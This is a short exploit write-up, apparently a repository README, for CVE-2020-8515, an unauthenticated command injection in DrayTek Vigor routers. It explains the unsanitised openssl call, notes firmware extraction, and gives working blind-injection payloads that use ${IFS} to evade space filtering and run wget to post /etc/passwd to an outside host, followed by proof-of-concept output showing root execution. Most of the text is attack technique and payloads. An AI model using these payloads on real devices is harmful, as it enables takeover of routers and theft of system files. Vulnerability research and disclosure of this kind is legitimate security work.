## DrayTek Command Injection
List of CVE :
* CVE-2020-8515

```bash
openssl rsautl -inkey '%s' -decrypt -in %s
```
first argument is our `keyPath` after `sym.imp.cgiGetValue`  
second argument is string of `/tmp/rsa/binary_login`  

No string parser function, limitation. perfect situation of command injection.  

to create an exploit for this, first i try to look around on the firmware binary of vigor 3900 v1.4.4. extract the *UBI* Image  
and dump the image to create some rootfs folder.  

why so ? first i must know the embeded binary inside this arm device so i can figure it out if this bug is triggered,  
but it will not output the result. this option is for blind command injection.  

the skullarmy blog say that there's space limitation, so i replace the space with `${IFS}`  
![alt text](https://1.bp.blogspot.com/-TWVGJJ56sDs/XjHZ3gPlDnI/AAAAAAAABXU/NR3BGlbaapcHHTSw-sTZVC3glgqptU4SACEwYBhgL/s1600/2020-01-29_16-15_1.png "space limitation")  
so i picked up this payload `/bin/wget${IFS}--post-file=/etc/passwd${IFS}https://bla.bla.com` and start the the job.  

after a quite long trial-error, i get my first blind with `'\n/bin/wget${IFS}--post-file=/etc/passwd${IFS}https://bla.bla.com${IFS}#`

but it doesn't send the passwd content. i try to put newline on the end of the payload and it's work!  
`'\n/bin/wget${IFS}--post-file=/etc/passwd${IFS}https://bla.bla.com${IFS}\n#`

try with other command :
```bash
▶ python3 poc.py 
b'uid=0(root) gid=0(root)\nuid=0(root) gid=0(root)\n'
```

### Credits & Thx for :
* [@Netlab360](https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/)
* [@skullarmy](https://www.skullarmy.net/2020/01/draytek-unauthenticated-rce-in-draytek.html)
